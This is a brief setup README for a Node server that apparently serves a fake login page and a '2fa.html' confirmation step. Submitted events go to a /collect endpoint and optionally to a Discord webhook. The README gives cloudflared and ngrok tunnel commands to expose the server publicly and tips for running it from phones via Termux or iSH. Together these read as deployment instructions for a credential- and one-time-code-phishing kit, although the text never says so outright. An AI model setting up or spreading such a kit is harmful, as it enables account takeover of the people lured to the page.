# Setup

## Environment

```bash
export PORT=8080
export DISCORD_WEBHOOK="https://discord.com/api/webhooks/ID/TOKEN"  # optional
node server.js
```

No secrets are stored in the repo. Webhook is env-only.

## Endpoints

| Path | Method | Purpose |
|------|--------|--------|
| `/` | GET | Login UI |
| `/2fa.html` | GET | Confirmation step |
| `/collect` | POST | JSON events |
| `/list` | GET | Recent events (local) |

## Tunnels

```bash
cloudflared tunnel --url http://127.0.0.1:8080
ngrok http 8080
```

## Mobile

Termux and iSH both run `node server.js`. Prefer cloudflared on Termux; on iSH keep the session alive or host the tunnel elsewhere.
